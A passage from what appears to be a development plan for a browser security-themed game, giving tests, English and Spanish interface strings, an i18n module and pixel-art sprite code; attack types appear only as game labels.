      for (const m of readFileSync(f, 'utf8').matchAll(/\bt\('([\w.]+)'/g)) expect(keys, `${f}: ${m[1]}`).toHaveProperty([m[1]]);
    }
  });
});

describe('t', () => {
  it('interpolates, switches language and falls back to the key', () => {
    expect(t('draft.waveClear', { n: 3 })).toBe('WAVE 3 CLEAR');
    setLang('es');
    expect(t('draft.waveClear', { n: 3 })).toBe('OLEADA 3 SUPERADA');
    expect(t('no.such.key')).toBe('no.such.key');
    expect(loc({ en: 'a', es: 'b' })).toBe('b');
    expect(fmtNum(18420)).toBe('18.420');
    setLang('en');
    expect(fmtNum(18420)).toBe('18,420');
  });
  it('detects Spanish browsers', () => {
    expect(detectLang('es-CO')).toBe('es');
    expect(detectLang('en-US')).toBe('en');
    expect(detectLang('fr')).toBe('en');
  });
});
```

Note the `toHaveProperty([key])` form: an array path makes Vitest treat dotted keys literally.

Run: `npx vitest run src/i18n` → FAIL.

- [ ] **Step 2: Write `src/i18n/en.json`**

```json
{
  "hud": { "score": "SCORE", "credits": "CREDITS", "reputation": "REPUTATION", "wave": "WAVE", "hintsOn": "HINTS ON ×0.75", "hintsOff": "HINTS OFF", "pause": "PAUSE · P", "root": "ROOT" },
  "lane": { "0": "ssh", "1": "auth", "2": "query", "3": "user posts", "4": "other ports" },
  "uptime": "UPTIME",
  "actor": { "you": "YOU", "squire": "SQUIRE", "target": "TARGET · SPACE" },
  "float": { "tricky": "TRICKY", "sneaky": "SNEAKY", "squire": "SQUIRE", "notFooled": "NOT FOOLED", "neutralized": "◆ NEUTRALIZED", "falsePositive": "☹ FALSE POSITIVE", "damage": "−{n}% UPTIME" },
  "field": { "lockdown": "PORT LOCKDOWN", "banned": "BANNED {n}", "tarpit": "TARPIT · repeat IPs crawl", "cdn": "CDN · RATE LIMIT", "coach": "↑ ↓ lane · Tab next packet · Space spear · do nothing and it passes" },
  "family": { "legit": "REAL USER", "sqli": "SQL INJECTION", "xss": "XSS", "brute": "BRUTE FORCE", "scan": "PORT SCAN", "flood": "BOTNET FLOOD" },
  "tier": { "1": "obvious", "2": "tricky", "3": "sneaky" },
  "bug": { "spider": "spider", "worm": "worm", "beetle": "beetle", "fly": "fly", "gnat": "gnats" },
  "inspector": {
    "title": "INSPECTOR", "target": "TARGET", "held": "HELD", "bugged": "BUGGED · {bug}", "src": "SRC {ip}", "lane": "LANE {lane}",
    "decoded": "DECODED", "ask": "Malicious or legit? Tab or click to target it.", "askLocked": "Space to throw. Esc to let it go. Do nothing and it passes.",
    "empty1": "↑ ↓ pick a lane, Tab cycles the packets coming down it, Space throws a spear.",
    "empty2": "Hover a packet to read it, the event log for verdicts, or a loadout tile to see what it does.",
    "verdict": "VERDICT · {family}", "decoy": "looked scary, was fine", "loadout": "LOADOUT", "irl": "IN REAL LIFE", "catch": "THE CATCH"
  },
  "log": {
    "title": "EVENT LOG", "hint": "hover a line for the verdict", "count": "{n} events · {m} mistakes", "all": "ALL", "mistakes": "MISTAKES",
    "hit": "HIT", "squire": "SQUIRE HIT", "rule": "RULE BLOCKED", "served": "SERVED", "neutralized": "NEUTRALIZED", "breach": "BREACH", "fp": "FALSE POSITIVE",
    "youHit": "you hit a real user", "squireHit": "the squire hit a real user", "by": "by {rule}", "notFooled": "not fooled", "uptimeLoss": "−{n}% uptime"
  },
  "draft": {
    "waveClear": "WAVE {n} CLEAR", "stats": "Uptime {u}% · reputation {r}/10 · {c} credits", "choose": "CHOOSE AN UPGRADE", "freeNote": "the first pick is free",
    "buyNote": "buy more with credits, or move on", "take": "TAKE · FREE", "buy": "BUY · {n} cr", "taken": "TAKEN ✓", "reroll": "REROLL · {n} cr", "next": "NEXT WAVE ▸",
    "cat": { "KNIGHT": "KNIGHT", "FIREWALL": "FIREWALL", "SERVER": "SERVER" },
    "rarity": { "COMMON": "COMMON", "RARE": "RARE", "LEGENDARY": "LEGENDARY" }
  },
  "pause": { "title": "PAUSED", "hint": "P to resume", "resume": "RESUME", "quit": "QUIT TO TITLE", "reducedOn": "REDUCED EFFECTS · ON", "reducedOff": "REDUCED EFFECTS · OFF" },
  "title": {
    "tagline": "Guard the server. Read the packets. Let the real users through.", "play": "PLAY CAMPAIGN", "overtime": "OVERTIME",
    "overtimeLocked": "win the campaign to unlock", "howto": "HOW TO PLAY", "best": "BEST", "bestCampaign": "Campaign · grade {g} · {s} pts",
    "bestOvertime": "Overtime · wave {w} · {s} pts", "rootOn": "ROOT MODE · faster packets, no hints, ×1.5 score", "site": "jorius.github.io ↗"
  },
  "howto": {
    "title": "HOW TO PLAY", "back": "BACK",
    "k1": "pick a lane", "k2": "next packet in that lane (Shift: previous)", "k3": "throw a spear at the target", "k4": "let the target go",
    "k5": "click a packet to target it", "k6": "hints: underline the tells (score ×0.75)", "k7": "pause",
    "lesson": "Packets that reach the wall of fire burn into your server. Spear the attacks, let real users through, and spend each wave's credits on upgrades that teach real defences. Cheap rules leak and misfire; root-cause fixes cost more and stay clean."
  },
  "debrief": {
    "won": "SERVER HELD", "serverDown": "SERVER DOWN", "usersGone": "USERS GONE", "overtimeOver": "OVERTIME OVER", "grade": "GRADE", "score": "SCORE", "waves": "WAVES",
    "newBest": "NEW BEST", "tampered": "TAMPERED · not saved", "hits": "Hits · obvious / tricky / sneaky", "decoys": "Decoys let through", "squire": "Squire hits",
    "rules": "Rule blocks", "served": "Users served", "neutralized": "Neutralized at the server", "fps": "False positives", "breaches": "Breaches", "uptime": "Uptime left",
    "mistakes": "YOUR MISTAKES", "noMistakes": "No mistakes. None shall pass, indeed.", "copy": "COPY RESULT", "copied": "COPIED ✓", "again": "PLAY AGAIN", "toTitle": "TITLE"
  },
  "phone": { "title": "This one needs a keyboard.", "body": "None Shall Pass is a desktop game played with the arrow keys, Tab and Space. Send yourself the link and play it on a computer.", "copy": "COPY LINK", "copied": "COPIED ✓" },
  "console": { "title": "root@firewall:~", "greeting": "Type help." },
  "lang": { "toggle": "ES" }
}
```

- [ ] **Step 3: Write `src/i18n/es.json`**

```json
{
  "hud": { "score": "PUNTAJE", "credits": "CRÉDITOS", "reputation": "REPUTACIÓN", "wave": "OLEADA", "hintsOn": "PISTAS ON ×0.75", "hintsOff": "PISTAS OFF", "pause": "PAUSA · P", "root": "ROOT" },
  "lane": { "0": "ssh", "1": "acceso", "2": "búsqueda", "3": "comentarios", "4": "otros puertos" },
  "uptime": "DISPONIBILIDAD",
  "actor": { "you": "TÚ", "squire": "ESCUDERO", "target": "OBJETIVO · ESPACIO" },
  "float": { "tricky": "ENGAÑOSO", "sneaky": "SIGILOSO", "squire": "ESCUDERO", "notFooled": "NO TE ENGAÑARON", "neutralized": "◆ NEUTRALIZADO", "falsePositive": "☹ FALSO POSITIVO", "damage": "−{n}% DISPONIBILIDAD" },
  "field": { "lockdown": "PUERTOS CERRADOS", "banned": "BLOQUEADAS {n}", "tarpit": "BREA · las IP repetidas se arrastran", "cdn": "CDN · LÍMITE DE PETICIONES", "coach": "↑ ↓ carril · Tab siguiente paquete · Espacio lanza · si no haces nada, pasa" },
  "family": { "legit": "USUARIO REAL", "sqli": "INYECCIÓN SQL", "xss": "XSS", "brute": "FUERZA BRUTA", "scan": "ESCANEO DE PUERTOS", "flood": "INUNDACIÓN BOTNET" },
  "tier": { "1": "obvio", "2": "engañoso", "3": "sigiloso" },
  "bug": { "spider": "araña", "worm": "gusano", "beetle": "escarabajo", "fly": "mosca", "gnat": "mosquitos" },
  "inspector": {
    "title": "INSPECTOR", "target": "OBJETIVO", "held": "RETENIDO", "bugged": "CON BICHOS · {bug}", "src": "ORIGEN {ip}", "lane": "CARRIL {lane}",
    "decoded": "DECODIFICADO", "ask": "¿Malicioso o legítimo? Tab o clic para apuntarle.", "askLocked": "Espacio para lanzar. Esc para soltarlo. Si no haces nada, pasa.",
    "empty1": "↑ ↓ elige un carril, Tab recorre los paquetes que bajan por él, Espacio lanza una lanza.",
    "empty2": "Pasa el cursor por un paquete para leerlo, por el registro para ver veredictos, o por una mejora para ver qué hace.",
    "verdict": "VEREDICTO · {family}", "decoy": "parecía peligroso, estaba bien", "loadout": "EQUIPO", "irl": "EN LA VIDA REAL", "catch": "LA TRAMPA"
  },
  "log": {
    "title": "REGISTRO", "hint": "pasa el cursor por una línea para ver el veredicto", "count": "{n} eventos · {m} errores", "all": "TODO", "mistakes": "ERRORES",
    "hit": "IMPACTO", "squire": "ESCUDERO", "rule": "BLOQUEADO", "served": "ATENDIDO", "neutralized": "NEUTRALIZADO", "breach": "BRECHA", "fp": "FALSO POSITIVO",
    "youHit": "le diste a un usuario real", "squireHit": "el escudero le dio a un usuario real", "by": "por {rule}", "notFooled": "no te engañaron", "uptimeLoss": "−{n}% disponibilidad"
  },
  "draft": {
    "waveClear": "OLEADA {n} SUPERADA", "stats": "Disponibilidad {u}% · reputación {r}/10 · {c} créditos", "choose": "ELIGE UNA MEJORA", "freeNote": "la primera es gratis",
    "buyNote": "compra más con créditos, o sigue", "take": "TOMAR · GRATIS", "buy": "COMPRAR · {n} cr", "taken": "TOMADA ✓", "reroll": "BARAJAR · {n} cr", "next": "SIGUIENTE OLEADA ▸",
    "cat": { "KNIGHT": "CABALLERO", "FIREWALL": "FIREWALL", "SERVER": "SERVIDOR" },
    "rarity": { "COMMON": "COMÚN", "RARE": "RARA", "LEGENDARY": "LEGENDARIA" }
  },
  "pause": { "title": "EN PAUSA", "hint": "P para continuar", "resume": "CONTINUAR", "quit": "SALIR AL INICIO", "reducedOn": "EFECTOS REDUCIDOS · ON", "reducedOff": "EFECTOS REDUCIDOS · OFF" },
  "title": {
    "tagline": "Protege el servidor. Lee los paquetes. Deja pasar a los usuarios reales.", "play": "JUGAR CAMPAÑA", "overtime": "TIEMPO EXTRA",
    "overtimeLocked": "gana la campaña para desbloquearlo", "howto": "CÓMO JUGAR", "best": "MEJOR", "bestCampaign": "Campaña · nota {g} · {s} pts",
    "bestOvertime": "Tiempo extra · oleada {w} · {s} pts", "rootOn": "MODO ROOT · paquetes más rápidos, sin pistas, puntaje ×1.5", "site": "jorius.github.io ↗"
  },
  "howto": {
    "title": "CÓMO JUGAR", "back": "VOLVER",
    "k1": "elige un carril", "k2": "siguiente paquete en ese carril (Shift: anterior)", "k3": "lanza una lanza al objetivo", "k4": "suelta el objetivo",
    "k5": "haz clic en un paquete para apuntarle", "k6": "pistas: subraya las señales (puntaje ×0.75)", "k7": "pausa",
    "lesson": "Los paquetes que llegan al muro de fuego se queman dentro de tu servidor. Lancea los ataques, deja pasar a los usuarios reales y gasta los créditos de cada oleada en mejoras que enseñan defensas reales. Las reglas baratas fallan y se equivocan; las soluciones de raíz cuestan más y no dejan fugas."
  },
  "debrief": {
    "won": "SERVIDOR A SALVO", "serverDown": "SERVIDOR CAÍDO", "usersGone": "SIN USUARIOS", "overtimeOver": "FIN DEL TIEMPO EXTRA", "grade": "NOTA", "score": "PUNTAJE", "waves": "OLEADAS",
    "newBest": "NUEVO RÉCORD", "tampered": "TAMPERED · no se guarda", "hits": "Impactos · obvios / engañosos / sigilosos", "decoys": "Señuelos que dejaste pasar", "squire": "Impactos del escudero",
    "rules": "Bloqueos por reglas", "served": "Usuarios atendidos", "neutralized": "Neutralizados en el servidor", "fps": "Falsos positivos", "breaches": "Brechas", "uptime": "Disponibilidad restante",
    "mistakes": "TUS ERRORES", "noMistakes": "Sin errores. Nadie pasó, de verdad.", "copy": "COPIAR RESULTADO", "copied": "COPIADO ✓", "again": "JUGAR DE NUEVO", "toTitle": "INICIO"
  },
  "phone": { "title": "Este necesita un teclado.", "body": "None Shall Pass es un juego de escritorio que se juega con las flechas, Tab y Espacio. Envíate el enlace y juégalo en un computador.", "copy": "COPIAR ENLACE", "copied": "COPIADO ✓" },
  "console": { "title": "root@firewall:~", "greeting": "Escribe help." },
  "lang": { "toggle": "EN" }
}
```

- [ ] **Step 4: Implement `src/i18n/index.ts`**

```ts
// core
import type { Lang, Localized } from '../core/types';

// local
import en from './en.json';
import es from './es.json';

type Dict = { [k: string]: string | Dict };
const DICTS: Record<Lang, Dict> = { en, es };
let current: Lang = 'en';
const listeners = new Set<(l: Lang) => void>();

const lookup = (d: Dict, key: string): string | undefined => {
  let v: string | Dict | undefined = d;
  for (const part of key.split('.')) v = typeof v === 'object' ? v[part] : undefined;
  return typeof v === 'string' ? v : undefined;
};

export const lang = (): Lang => current;

export const setLang = (l: Lang): void => {
  current = l;
  if (typeof document !== 'undefined') document.documentElement.lang = l;
  listeners.forEach((fn) => fn(l));
};

export const onLang = (fn: (l: Lang) => void): (() => void) => {
  listeners.add(fn);
  return () => { listeners.delete(fn); };
};

export const detectLang = (nav: string = typeof navigator === 'undefined' ? 'en' : navigator.language): Lang =>
  nav.toLowerCase().startsWith('es') ? 'es' : 'en';

export const t = (key: string, vars?: Record<string, string | number>): string => {
  const raw = lookup(DICTS[current], key) ?? lookup(DICTS.en, key) ?? key;
  return vars ? raw.replace(/\{(\w+)\}/g, (m, k: string) => (k in vars ? String(vars[k]) : m)) : raw;
};

export const loc = (x: Localized): string => x[current];

export const fmtNum = (n: number): string =>
  current === 'es' ? String(Math.round(n)).replace(/\B(?=(\d{3})+(?!\d))/g, '.') : Math.round(n).toLocaleString('en-US');
```

Run: `npx vitest run` → PASS.

- [ ] **Step 5: Commit**

```bash
git add src/i18n
git commit -m "Add the English and Spanish interface strings" -m "Every label the UI will need is defined up front in both languages; a test fails the build if code asks for a key either file lacks." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 12: Pixel art as data

**Files:**
- Create: `src/art/pixels.ts`, `src/art/sprites.ts`, `src/art/textures.ts`, `src/art/dataurl.ts`
- Test: `src/art/pixels.test.ts`, `src/art/sprites.test.ts`

**Interfaces:**
- Consumes: `IconId` (Task 3), `RACK.rows` (Task 2).
- Produces:
  - `pixels.ts`: `type Grid = (string | null)[][]`; `PAL: Record<string, string>`; `grid(w, h)`; `draw(g, rows: [number, number, string][], dx?, dy?)`; `rect(g, x, y, w, h, c)`; `poly(g, pts: [number, number][], c)`; `line(g, x0, y0, x1, y1, c, w?)`; `outline(g)`; `paintGrid(ctx: { fillStyle: string | CanvasGradient | CanvasPattern; fillRect(x, y, w, h): void }, g, scale)`.
  - `sprites.ts`: `knightFoot(throwing)`, `knightHorse(frame: 0 | 1, throwing)`, `spear()`, `rackSprite(rows): { grid: Grid; leds: [number, number, 'blue' | 'green'][]; units: number[] }`, `ICONS: Record<'grate' | 'hammer' | 'tar' | 'lens' | 'shield' | 'tape' | 'eye' | 'lock' | 'cloud' | 'lockShut' | 'lockOpen', () => Grid>`, `critter(kind: BugKind, frame: 0 | 1)`, `type BugKind = 'spider' | 'worm' | 'beetle' | 'fly' | 'gnat'`, `BUG_OF: Record<MaliciousKind, BugKind>`, `iconGrid(icon: IconId): Grid`, `SPRITE_DEFS: { key: string; grid: () => Grid; scale: number }[]`.
  - `textures.ts`: `registerTextures(scene: Phaser.Scene): void` (creates one NEAREST-filtered canvas texture per `SPRITE_DEFS` entry; keys listed below).
  - `dataurl.ts`: `iconUrl(icon: IconId, size: 'tile' | 'card'): string` (memoized PNG data URL for DOM `<img>`), `gridUrl(g: Grid, scale: number): string`.
- Texture keys (used by Tasks 13–15): `knight-foot-idle`, `knight-foot-throw`, `knight-horse-0`, `knight-horse-1`, `knight-horse-throw`, `squire-idle`, `squire-throw`, `spear`, `spear-small`, `rack`, `hammer`, `lock-shut`, `lock-open`, `bug-<kind>-<0|1>` for every `BugKind`.

- [ ] **Step 1: Write the failing tests**

`src/art/pixels.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// local
import { draw, grid, line, outline, paintGrid, PAL, poly, rect } from './pixels';

describe('pixel helpers', () => {
  it('draws rows with offsets and ignores dots and out-of-bounds pixels', () => {
    const g = draw(grid(4, 3), [[0, 0, 'R.R'], [1, 3, 'RR']], 0, 1);
    expect(g[1]).toEqual(['R', null, 'R', null]);
    expect(g[2]).toEqual([null, null, null, 'R']);
  });

  it('outlines filled shapes with o on 4-neighbours only', () => {
    const g = grid(3, 3);
    g[1][1] = 'R';
    const o = outline(g);
    expect(o.map((r) => r.map((c) => c ?? '.').join(''))).toEqual(['.o.', 'oRo', '.o.']);
  });

  it('fills polygons, rects and lines', () => {
    const g = grid(6, 6);
    rect(g, 0, 0, 2, 2, 'B');
    poly(g, [[2, 2], [6, 2], [6, 6], [2, 6]], 'R');
    line(g, 0, 5, 1, 5, 'k');
    expect(g[0][1]).toBe('B');
    expect(g[3][3]).toBe('R');
    expect(g[5][0]).toBe('k');
  });

  it('paints horizontal runs with the palette colour', () => {
    const calls: [string, number, number, number, number][] = [];
    const ctx = { fillStyle: '' as string, fillRect(x: number, y: number, w: number, h: number) { calls.push([this.fillStyle, x, y, w, h]); } };
    const g = grid(4, 1);
    g[0] = ['R', 'R', null, 'B'];
    paintGrid(ctx, g, 3);
    expect(calls).toEqual([[PAL.R, 0, 0, 6, 3], [PAL.B, 9, 0, 3, 3]]);
  });
});
```

`src/art/sprites.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { RACK } from '../core/constants';
import { CARDS } from '../core/content/cards';

// local
import { BUG_OF, critter, iconGrid, knightFoot, knightHorse, rackSprite, spear, SPRITE_DEFS } from './sprites';

const size = (g: (string | null)[][]) => [g[0].length, g.length];
const filled = (g: (string | null)[][]) => g.flat().filter(Boolean).length;

describe('sprites', () => {
  it('keeps the knight inside a lane and the horse a little taller', () => {
    expect(size(knightFoot(false))).toEqual([21, 30]);
    expect(size(knightHorse(0, false))).toEqual([37, 33]);
    expect(filled(knightFoot(true))).toBeLessThan(filled(knightFoot(false)));
    expect(knightHorse(0, false)).not.toEqual(knightHorse(1, false));
  });

  it('builds a full-height rack with units and LEDs', () => {
    const r = rackSprite(RACK.rows);
    expect(size(r.grid)).toEqual([40, RACK.rows + 2]);
    expect(r.units.length).toBe(16);
    expect(r.leds.length).toBeGreaterThan(30);
  });

  it('animates every bug and maps every attack family to one', () => {
    for (const kind of Object.values(BUG_OF)) expect(critter(kind, 0)).not.toEqual(critter(kind, 1));
    expect(BUG_OF).toEqual({ sqli: 'spider', xss: 'worm', brute: 'beetle', scan: 'fly', flood: 'gnat' });
  });

  it('has an icon for every card and unique texture keys', () => {
    for (const c of CARDS) expect(filled(iconGrid(c.icon))).toBeGreaterThan(10);
    const keys = SPRITE_DEFS.map((d) => d.key);
    expect(new Set(keys).size).toBe(keys.length);
    expect(keys).toEqual(expect.arrayContaining(['knight-foot-idle', 'knight-horse-1', 'squire-throw', 'spear', 'spear-small', 'rack', 'hammer', 'lock-shut', 'lock-open', 'bug-gnat-1']));
    expect(size(spear())).toEqual([27, 5]);
  });
});
```

Run: `npx vitest run src/art` → FAIL.

- [ ] **Step 2: Implement `src/art/pixels.ts`**

```ts
export type Grid = (string | null)[][];

// One character per palette colour; 'o' is the auto-outline.
export const PAL: Record<string, string> = {
  o: '#0b0c10',
  l: '#8f9bb3', w: '#d5dceb', m: '#5d6680', d: '#3a4152', k: '#1b1d24',
  R: '#ff2f2f', r: '#a3161c', B: '#2fb6ff', b: '#16608f',
  T: '#a0703a', t: '#6b4722', S: '#eef2f7', s: '#a7b2c4', y: '#d9b44a',
  h: '#cfc9ba', H: '#958f81', n: '#6d685d', c: '#2a2c35', C: '#3a3d4a',
  F: '#121317', E: '#24272f', Q: '#3c414d', U: '#4a5061', V: '#2b2f39', Z: '#16181d', G: '#14532d', g: '#3ddc84',
  i: '#e8f8ff', j: '#8fdcff', x: '#7a2a1a', X: '#a8432a', z: '#5a1e12',
};

export const grid = (w: number, h: number): Grid => Array.from({ length: h }, () => Array<string | null>(w).fill(null));

export const draw = (g: Grid, rows: [number, number, string][], dx = 0, dy = 0): Grid => {
  for (const [y, x0, str] of rows) {
    [...str].forEach((ch, i) => {
      const yy = y + dy, xx = x0 + i + dx;
      if (ch !== '.' && g[yy] && xx >= 0 && xx < g[0].length) g[yy][xx] = ch;
    });
  }
  return g;
};

export const rect = (g: Grid, x: number, y: number, w: number, h: number, c: string): void => {
  for (let j = y; j < y + h; j++) for (let i = x; i < x + w; i++) if (g[j] && i >= 0 && i < g[0].length) g[j][i] = c;
};

export const poly = (g: Grid, pts: [number, number][], c: string): void => {
  for (let y = 0; y < g.length; y++) for (let x = 0; x < g[0].length; x++) {
    const px = x + 0.5, py = y + 0.5;
    let inside = false;
    for (let i = 0, j = pts.length - 1; i < pts.length; j = i++) {
      const [xi, yi] = pts[i], [xj, yj] = pts[j];
      if ((yi > py) !== (yj > py) && px < ((xj - xi) * (py - yi)) / (yj - yi) + xi) inside = !inside;
    }
    if (inside) g[y][x] = c;
  }
};

export const line = (g: Grid, x0: number, y0: number, x1: number, y1: number, c: string, w = 1): void => {
  const n = Math.max(Math.abs(x1 - x0), Math.abs(y1 - y0), 1);
  for (let i = 0; i <= n; i++) {
    const x = Math.round(x0 + ((x1 - x0) * i) / n), y = Math.round(y0 + ((y1 - y0) * i) / n);
    for (let k = 0; k < w; k++) if (g[y] && x + k >= 0 && x + k < g[0].length) g[y][x + k] = c;
  }
};

export const outline = (g: Grid): Grid => {
  const out = g.map((r) => r.slice());
  for (let y = 0; y < g.length; y++) for (let x = 0; x < g[0].length; x++) {
    if (g[y][x]) continue;
    if ([[1, 0], [-1, 0], [0, 1], [0, -1]].some(([a, b]) => g[y + b]?.[x + a])) out[y][x] = 'o';
  }
  return out;
};

type FillCtx = { fillStyle: string | CanvasGradient | CanvasPattern; fillRect(x: number, y: number, w: number, h: number): void };

export const paintGrid = (ctx: FillCtx, g: Grid, scale: number): void => {
  g.forEach((row, y) => {
    let x = 0;
    while (x < row.length) {
      const c = row[x];
      if (!c) { x++; continue; }
      let e = x;
      while (e + 1 < row.length && row[e + 1] === c) e++;
      ctx.fillStyle = PAL[c];
      ctx.fillRect(x * scale, y * scale, (e - x + 1) * scale, scale);
      x = e + 1;
    }
  });
};
```

- [ ] **Step 3: Implement `src/art/sprites.ts`** (ported from the v4 mock's `sprites.js`, plus the cloud icon and the gnat)

```ts
// core
import type { IconId } from '../core/content/cards';
import type { MaliciousKind } from '../core/types';

// local
import { draw, grid, line, outline, poly, rect, type Grid } from './pixels';

type Rows = [number, number, string][];

const SHIELD = (x: number, y: number): Rows => [
  [y, x, 'llllll'], [y + 1, x, 'lBBBBb'], [y + 2, x, 'lBBwBb'], [y + 3, x, 'lBwwwb'], [y + 4, x, 'lBBwBb'],
  [y + 5, x, 'lBBwBb'], [y + 6, x + 1, 'lBBb'], [y + 7, x + 1, 'lBb'], [y + 8, x + 2, 'lb'], [y + 9, x + 2, 'l'],
];

const HELM = (x: number, y: number): Rows => [
  [y - 4, x + 5, 'RR'], [y - 3, x + 4, 'RRRR'], [y - 2, x + 4, 'RRrrr'], [y - 1, x + 5, 'R'], [y - 1, x + 7, 'rrr'],
  [y, x + 1, 'llmmmd'], [y + 1, x, 'lwlmmmmd'], [y + 2, x, 'llmmmmmd'], [y + 3, x, 'RRRRmmmd'], [y + 4, x, 'kkmmmmdd'],
  [y + 5, x, 'lmkmmmdd'], [y + 6, x + 1, 'mmmmdd'], [y + 7, x + 2, 'dddd'],
];

// The Black Knight on foot, facing left, spear upright (or thrown).
export const knightFoot = (throwing: boolean): Grid => {
  const rows: Rows = [];
  if (!throwing) {
    rows.push([1, 17, 'S'], [2, 16, 'sSs'], [3, 16, 'sSs'], [4, 16, 'sSs'], [5, 17, 'S'], [6, 17, 's']);
    for (let y = 7; y <= 28; y++) rows.push([y, 17, 'T']);
  }
  rows.push(...HELM(5, 5));
  rows.push(
    [13, 4, 'llmdmmmdmmd'], [14, 3, 'lwlmdmmmdmmmd'],
    [15, 7, 'dkkRkkmdd'], [16, 7, 'dkkRkkmd'], [17, 7, 'dkRRRkmd'], [18, 7, 'dkkRkkmd'], [19, 7, 'dkkRkkdd'], [20, 7, 'ttttyttt'],
    [21, 7, 'mmd'], [21, 11, 'mmd'],
    [22, 7, 'lmd'], [22, 11, 'mmd'], [23, 7, 'lmd'], [23, 11, 'mmd'], [24, 7, 'mmd'], [24, 11, 'mdd'],
    [25, 7, 'lmd'], [25, 11, 'mmd'], [26, 7, 'lmd'], [26, 11, 'mmd'], [27, 5, 'llmmd'], [27, 11, 'mmmd'],
  );
  if (!throwing) rows.push([15, 16, 'mld'], [16, 16, 'dmd']);
  else rows.push([13, 14, 'dm'], [12, 15, 'mm'], [11, 15, 'lm'], [10, 15, 'ml']);
  rows.push(...SHIELD(1, 14));
  return outline(draw(grid(21, 30), rows));
};

// The knight on his destrier; frame 0/1 are the gallop's two leg poses.
export const knightHorse = (frame: 0 | 1, throwing: boolean): Grid => {
  const g = grid(37, 33);
  poly(g, [[30, 16], [33, 17], [35, 25], [33, 24], [31, 20]], 'k');
  const legs: [number, number, number, number, string][] = frame === 0
    ? [[16, 24, 16, 30, 'H'], [29, 24, 29, 30, 'H'], [13, 24, 13, 30, 'h'], [26, 24, 26, 30, 'h']]
    : [[16, 24, 13, 30, 'H'], [29, 24, 33, 29, 'H'], [13, 24, 9, 30, 'h'], [26, 24, 29, 30, 'h']];
  legs.forEach(([x0, y0, x1, y1, c]) => { line(g, x0, y0, x1, y1, c, 2); line(g, x1, y1, x1, y1, 'k', 2); });
  poly(g, [[8, 6], [8, 3], [10, 6]], 'h');
  poly(g, [[10, 6], [11, 3], [12, 7]], 'H');
  poly(g, [[10, 7], [13, 8], [17, 15], [16, 21], [11, 21], [9, 14], [11, 11]], 'h');
  poly(g, [[7, 6], [11, 6], [12, 9], [10, 13], [6, 17], [2, 18], [0, 17], [1, 15], [5, 10]], 'h');
  poly(g, [[0, 16], [3, 15], [4, 17], [2, 18], [0, 17]], 'H');
  poly(g, [[10, 6], [12, 6], [17, 13], [17, 16], [15, 15], [12, 9]], 'k');
  g[9][8] = 'k'; g[17][1] = 'n';
  line(g, 9, 8, 6, 14, 'R'); line(g, 2, 15, 6, 14, 'R'); line(g, 6, 14, 17, 14, 'r');
  poly(g, [[12, 16], [28, 15], [31, 17], [31, 22], [28, 24], [13, 24], [11, 21]], 'h');
  poly(g, [[13, 15], [29, 15], [30, 22], [29, 25], [13, 25], [12, 22]], 'c');
  [16, 20, 24, 28].forEach((x) => line(g, x, 16, x, 23, 'C'));
  line(g, 13, 24, 29, 24, 'R'); line(g, 13, 25, 29, 25, 'r');
  draw(g, [[18, 20, 'BB'], [19, 19, 'BwwB'], [20, 20, 'BB']]);
  draw(g, [[15, 13, 'tTTTTTTTTt']]);
  if (!throwing) {
    draw(g, [[0, 25, 'S'], [1, 24, 'sSs'], [2, 24, 'sSs'], [3, 24, 'sSs'], [4, 25, 'S'], [5, 25, 's']]);
    line(g, 25, 6, 25, 26, 'T');
  }
  draw(g, HELM(14, 4));
  draw(g, [[12, 14, 'lmdmmmdmmd'], [13, 14, 'dkkRkkmdd'], [14, 14, 'dkRRRkmd'],
    [16, 18, 'lmd'], [17, 18, 'lmd'], [18, 18, 'lmd'], [19, 18, 'lmd'], [20, 17, 'llmd'], [21, 17, 'yyy']]);
  if (!throwing) draw(g, [[12, 24, 'mld'], [13, 24, 'dmd']]);
  else draw(g, [[11, 22, 'dm'], [10, 23, 'mm'], [9, 24, 'lm']]);
  draw(g, SHIELD(13, 11));
  return outline(g);
};

// A thrown spear, pointing left.
export const spear = (): Grid =>
  outline(draw(grid(27, 5), [[1, 1, 'sS'], [2, 0, 'SSSs'], [3, 1, 'sS'], [2, 4, 'TTTTTTTTTTTTTTTTTTTTt'], [1, 21, 'R'], [3, 22, 'R'], [1, 23, 'r']]));

// The server rack, `rows` tall; LEDs are returned separately so the view can blink them.
export const rackSprite = (rows: number): { grid: Grid; leds: [number, number, 'blue' | 'green'][]; units: number[] } => {
  const g = grid(40, rows + 2);
  const leds: [number, number, 'blue' | 'green'][] = [];
  const units: number[] = [];
  rect(g, 0, 0, 40, rows, 'F'); rect(g, 1, 1, 38, rows - 2, 'E');
  rect(g, 2, 2, 2, rows - 4, 'Q'); rect(g, 36, 2, 2, rows - 4, 'Q');
  for (let y = 4; y < rows - 2; y += 3) { g[y][3] = 'Z'; g[y][36] = 'Z'; }
  for (let x = 6; x < 34; x += 2) rect(g, x, 3, 1, 2, 'Z');
  let i = 0;
  for (let y = 7; y + 7 <= rows - 13; y += 8, i++) {
    units.push(y);
    rect(g, 5, y, 30, 7, 'U'); rect(g, 6, y + 1, 28, 5, 'V');
    if (i % 3 === 1) {
      for (let x = 7; x < 24; x += 2) rect(g, x, y + 2, 1, 3, 'Z');
      rect(g, 25, y + 2, 5, 3, 'G');
      leds.push([26, y + 3, 'green'], [28, y + 3, 'green']);
    } else {
      [7, 13, 19, 25].forEach((x) => { rect(g, x, y + 2, 5, 3, 'Z'); rect(g, x + 1, y + 3, 3, 1, 'l'); });
    }
    leds.push([32, y + 2, i % 2 ? 'green' : 'blue'], [32, y + 4, 'blue']);
    rect(g, 34, y + 3, 1, 1, i % 2 ? 'B' : 'R');
  }
  for (let y = 10; y < rows - 14; y++) g[y][35] = y < rows / 2 ? 'B' : 'R';
  const py = rows - 11;
  rect(g, 5, py, 30, 8, 'U'); rect(g, 6, py + 1, 28, 6, 'V');
  [9, 23].forEach((x) => { rect(g, x, py + 2, 8, 4, 'Z'); rect(g, x + 1, py + 3, 6, 2, 'Q'); rect(g, x + 3, py + 2, 2, 4, 'Q'); });
  rect(g, 2, rows, 4, 2, 'F'); rect(g, 34, rows, 4, 2, 'F');
  return { grid: g, leds, units };
};

export const ICONS = {
  grate: (): Grid => {
    const g = grid(16, 14);
    rect(g, 1, 1, 14, 12, 'd'); rect(g, 2, 2, 12, 10, 'k');
    [3, 6, 9, 12].forEach((x) => rect(g, x, 2, 1, 10, 'l'));
    rect(g, 2, 6, 12, 1, 'm');
